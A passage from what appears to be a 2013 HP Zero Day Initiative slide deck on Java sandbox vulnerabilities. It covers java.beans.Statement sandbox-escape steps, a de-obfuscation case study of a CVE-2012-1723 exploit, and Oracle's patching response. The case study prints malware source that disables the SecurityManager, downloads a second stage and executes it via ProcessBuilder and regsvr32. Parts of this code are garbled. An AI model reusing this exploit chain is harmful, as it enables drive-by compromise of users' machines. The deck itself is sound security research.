java.beans.Statement	
Exploitation Techniques	
Represents a Single Java Statement	
•  instanceVariable.instanceMethod(argument1)	
Has an AccessControlContext Instance Variable	
•  Replace with AccessControlContext that has AllPermission	
1. 
Create the Statement	
–  Statement s = new Statement(System.class, “setSecurityManager”, new Object[1])	
2. 
Replace the AccessControlContext with a More Powerful One	
–  Permission p = new Permissions();	
–  p.add(new AllPermission());	
–  new AccessControlContext(new ProtectionDomain[]{new ProtectionDomain(null, p)});	
3. 
Execute the Statement	
–  s.execute();	
© Copyright 2013 Hewlett-Packard Development Company, L.P.  The information contained herein is subject to change without notice.	
45	
CVE-2012-1723	
Case Study	
Vulnerability in the HotSpot Bytecode Veriﬁer	
•  Leads to Type Confusion	
Characteristics	
•  At Least 100 Instance Variables of a Class	
–  Do not need to be set	
•  A Static Variable of Another Class	
•  A Method within the Class	
–  Takes the Static Class’ Type	
–  Returns the Instance Variables’ Type	
–  Repeated Calls to this Method with Null as the Sole Argument	
© Copyright 2013 Hewlett-Packard Development Company, L.P.  The information contained herein is subject to change without notice.	
46	
Case Study	
Contains Six Class Files	
Three Useful	
•  Adw.class	
–  Contains three static methods	
–  Only one used	
•  dqqOzf.class	
–  Implements PrivilegedExceptionAction	
–  Contains a call to System.setSecurityManager	
•  qWodxNpkOs.class	
–  Extends Applet	
–  Execution starts in its init method	
Three Unused	
•  dumppzGr.class	
–  No static initializer	
–  Never referenced	
•  qFvtPH.class	
–  No static initializer	
–  Never referenced	
•  vceBGI.class	
–  No static initializer	
–  Never referenced	
CVE-2012-1723	
© Copyright 2013 Hewlett-Packard Development Company, L.P.  The information contained herein is subject to change without notice.	
47	
CVE-2012-1723	
Case Study	
No Characteristics of CVE-2012-1723	
•  Need to De-obfuscate to Find the Actual CVE	
–  Obfuscated with Allitori’s Java Obfuscator	
•  Did Not Use Options Such as Code Flow Obfuscation	
•  Apply Compiler Optimizations to De-obfuscate	
–  Constant Propagation	
–  Dead Code Elimination	
–  Function Inlining	
–  Function Evaluation	
© Copyright 2013 Hewlett-Packard Development Company, L.P.  The information contained herein is subject to change without notice.	
48	
CVE-2012-1723	
Case Study	
Constant Propagation and Function Evaluation	
public static URL RWdvAlV(String paramString, int paramInt)	
  throws Exception	
{	
  String str = paramString;	
  str = str + (char)(Math.min(113, 2454) + paramInt);	
  str = str + (char)(Math.min(116, 23544) + paramInt);	
  str = str + (char)(Math.min(109, 23544) + paramInt);	
  str = str + (char)(Math.min(66, 7275) + paramInt);	
  str = str + (char)(Math.min(55, 3235) + paramInt);	
  str = str + (char)(Math.min(55, 2225) + paramInt);	
  str = str + (char)(Math.min(55, 6275) + paramInt);	
  return new URL(str);	
}	
RWdvAlV('f', -8)	
new URL(”file:///”)	
© Copyright 2013 Hewlett-Packard Development Company, L.P.  The information contained herein is subject to change without notice.	
49	
CVE-2012-1723	
Case Study	
Dead Code Elimination and Function Inlining	
int wRXNjHtp(String paramString, int paramInt1, 	
 int paramInt2, long paramLong)	
{	
  int i = Math.min(333856, 207293) ^ 0x66493;	
  int j = Math.min(421682, 199391) % 85754;	
  int k = Math.abs(263858) + 211007;	
  int m = Math.abs(23452) + 221538;	
  return paramInt1 * 324346 + paramInt1 % 98101;	
}	
int wRXNjHtp(String paramString, int paramInt1, 	
 int paramInt2, long paramLong)	
{	
  return paramInt1 * 324346 + paramInt1 % 98101;	
}	
int wRXNjHtp(int paramInt1)	
{	
  return paramInt1 * 324346 + paramInt1 % 98101;	
}	
© Copyright 2013 Hewlett-Packard Development Company, L.P.  The information contained herein is subject to change without notice.	
50	
//EvilApplet (formerly qWodxNpkOs)	
package cve_2012_1723;	
import com.sun.org.glassfish.gmbal.ManagedObjectManagerFactory;	
import com.sun.org.glassfish.gmbal.util.GenericConstructor;	
import java.applet.Applet;	
import java.io.ByteArrayOutputStream;	
import java.io.InputStream;	
import java.lang.reflect.Method;	
public class EvilApplet extends Applet {	
  public void init() {	
    String str = System.getProperty("java.version");	
    if (str.indexOf("1.7") != -1) {	
        try {	
          ByteArrayOutputStream localByteArrayOutputStream = new ByteArrayOutputStream();	
          byte[] arrayOfByte = new byte[8192];	
          InputStream localInputStream = getClass().getResourceAsStream("dqqOzf.class");	
          int i;	
          while ((i = localInputStream.read(arrayOfByte)) > 0)	
            localByteArrayOutputStream.write(arrayOfByte, 0, i);	
          arrayOfByte = localByteArrayOutputStream.toByteArray();	
          GenericConstructor localGenericConstructor = new GenericConstructor(Object.class,"sun.invoke.anon.AnonymousClassLoader",new Class[0]);	
          Object localObject = localGenericConstructor.create(new Object[0]);	
          Method localMethod = ManagedObjectManagerFactory.getMethod(localObject.getClass(), "loadClass", new Class[] { Byte[].class });	
          Class ACLdqqOzf = (Class)localMethod.invoke(localObject, new Object[] { arrayOfByte });	
          EvilActionClass.triggerDoPrivBlock(getParameter("Sjuzeod"), ACLdqqOzf);	
        } catch (Exception e) { }	
    }	
  }	
}	
© Copyright 2013 Hewlett-Packard Development Company, L.P.  The information contained herein is subject to change without notice.	
51	
//EvilActionClass (formerly dqqOzf)	
package cve_2012_1723;	
import java.io.BufferedInputStream;	
import java.io.BufferedOutputStream;	
import java.io.FileOutputStream;	
import java.net.URL;	
import java.security.AccessController;	
import java.security.PrivilegedExceptionAction;	
public class EvilActionClass implements PrivilegedExceptionAction {	
  public EvilActionClass(String paramString1) {	
    try {	
      AccessController.doPrivileged(this);	
      getSaveAndRunSecondStage(paramString1);	
    } catch (Exception e) { }	
  }	
  public static void triggerDoPrivBlock(String obfuscatedURL, Class paramClass) 	
throws Exception {	
    String[] arrayOfString = obfuscatedURL.split("hj");	
    String url = "";	
    int i = 0;	
    while (i = 0) {	
          bos.write(buf, 0, i);	
      }	
      bos.close();	
      bis.close();	
       try {	
           Process localProcess = new ProcessBuilder(new String[] { droppedFileName }).start
();	
       } catch (Exception localException) { }	
       Process localProcess2 = new ProcessBuilder(new String[]{"regsvr32.exe", "/s", 
droppedFileName}).start();	
    } catch (Exception e) { }	
  }	
}	
© Copyright 2013 Hewlett-Packard Development Company, L.P.  The information contained herein is subject to change without notice.	
53	
CVE-2012-1723  CVE-2012-5076	
Case Study	
De-Obfuscated Funcationality	
1.  GenericConstructor instantiates a restricted class, AnonymousClassLoader	
2.  ManagedObjectManagerFactory is used to get access to the loadClass instance method of AnonymousClassLoader	
3.  AnonymousClassLoader is used load a malicious subclass of PrivilegedExceptionAction	
4.  At this point, a function inside our malicious subclass is executed	
5.  De-obfuscate a URL to grab the second stage from	
6.  Instantiate the subclass with the URL	
7.  The constructor calls AccessController.doPrivileged() on itself	
8.  The run method is executed to nulliﬁes the SecurityManager	
9.  Download the second stage and execute it	
© Copyright 2013 Hewlett-Packard Development Company, L.P.  The information contained herein is subject to change without notice.	
54	
$20,000 Dollar Question	
Pwn2Own 2013	
What Vulnerability Types Would Researchers Bring?	
•  Expectation: Sandbox Bypasses due to Unsafe Reﬂection	
•  Reality: The Top 4 Vulnerability Types Aﬀecting Java	
© Copyright 2013 Hewlett-Packard Development Company, L.P.  The information contained herein is subject to change without notice.	
Vendor Response Review	
© Copyright 2013 Hewlett-Packard Development Company, L.P.  The information contained herein is subject to change without notice.	
56	
Lather, Rinse, Repeat	
Handling Vulnerability Disclosure	
Improving Vulnerability Turnaround Time	
•  ZDI Vulnerabilities Patched within 3 Months of Submission	
•  Improved Vulnerability Turnaround Time Over Last Three Years	
Aggressively Adjust Attack Surface	
•  “Killed” 15 Zero Day Initiative Cases due to Patching	
–  JDK 7u13 Killed Three Untrusted Pointer Dereferencing Cases	
–  JDK 7u15 Kill Two Least Privilege Violation Cases	
•  Increased Applet Package Restrictions	
•  Tightening Up Least Privilege Violations	
Increased Patch Update Cycle	
•  4 Releases a Year	
© Copyright 2013 Hewlett-Packard Development Company, L.P.  The information contained herein is subject to change without notice.	
57	
Package Restriction List Modiﬁcations	
© Copyright 2013 Hewlett-Packard Development Company, L.P.  The information contained herein is subject to change without notice.	
58	
Full Package Restriction List for JDK 7u25	
JDK 7u25	
sun	
com.sun.org.apache.xalan.internal.xslt	
org.mozilla.jss	
com.sun.xml.internal	
com.sun.org.apache.xalan.internal.xsltc.cmdline	
com.sun.browser	
com.sun.imageio	
com.sun.org.apache.xalan.internal.xsltc.compiler	
com.sun.glass	
com.sun.istack.internal	
com.sun.org.apache.xalan.internal.xsltc.trax	
com.sun.javafx	
com.sun.jmx	
com.sun.org.apache.xalan.internal.xsltc.util	
com.sun.media.jfxmedia	
com.sun.proxy	
com.sun.org.apache.xml.internal.res	
com.sun.media.jfxmediaimpl	
com.sun.org.apache.bcel.internal	
com.sun.org.apache.xml.internal.serializer.utils	
com.sun.openpisces	
com.sun.org.apache.regexp.internal	
com.sun.org.apache.xml.internal.utils	
com.sun.prism	
com.sun.org.apache.xerces.internal	
com.sun.org.apache.xml.internal.security	
com.sun.scenario	
com.sun.org.apache.xpath.internal	
com.sun.org.glassﬁsh	
com.sun.t2k	
com.sun.org.apache.xalan.internal.extensions	
org.jcp.xml.dsig.internal	
com.sun.webpane	
com.sun.org.apache.xalan.internal.lib	
com.sun.java.accessibility	
com.sun.pisces	
com.sun.org.apache.xalan.internal.res	
com.sun.javaws	
com.sun.webkit	
com.sun.org.apache.xalan.internal.templates	
com.sun.deploy	
com.sun.org.apache.xalan.internal.utils	
com.sun.jnlp	
© Copyright 2013 Hewlett-Packard Development Company, L.P.  The information contained herein is subject to change without notice.	
Conclusion	
© Copyright 2013 Hewlett-Packard Development Company, L.P.  The information contained herein is subject to change without notice.	
60	
Oracle Weathered Quite The Storm	
Large Number of Vulnerability Discoveries	
50+ New Zero Day Initiative Submissions over the Last 3 Quarters	
0-day Vulnerabilities Leveraged by Advisories	
Largest Java Security Patches to Date	
Focus on the Sandbox Bypasses	
Unsafe Reﬂection Most Proliﬁc Issue	
Type Confusion Most Exploited Vulnerability	
2D Sub-component Produces Most Severe Vulnerabilities But Not Utilized	
Process Improvements by Oracle	
More Frequent Security Patch Schedule	
Modiﬁcations to Reduce Attack Surface	
What Will Tomorrow Hold?	
© Copyright 2013 Hewlett-Packard Development Company, L.P.  The information contained herein is subject to change without notice.	
61	
Thank You!	
ZDI Researchers Submitting Java 
Vulnerabilities Over Last Three Years	
Providing Supporting  Material  
for this Paper	
Alin Rad Pop	
PI:EMAIL	
Anonymous 
Anonymous	
Anonymous	
axtaxt	
Ben Murphy	
Chris Ries	
James Forshaw	
Joshua J. Drake	
Michael Schierl	
Peter Vreugdenhil	
Sami Koivu	
Vitaliy Toropov	
VUPEN Security	
Mario Vuksan of Reversing Labs	
Adam Gowdiak of Security Explorations	
© Copyright 2013 Hewlett-Packard Development Company, L.P.  The information contained herein is subject to change without notice.	
Good Luck Bug Hunting! 
Learn more at: 
zerodayinitiative.com 
hp.com/go/hpsr 
java.com/en/download/uninstall.jsp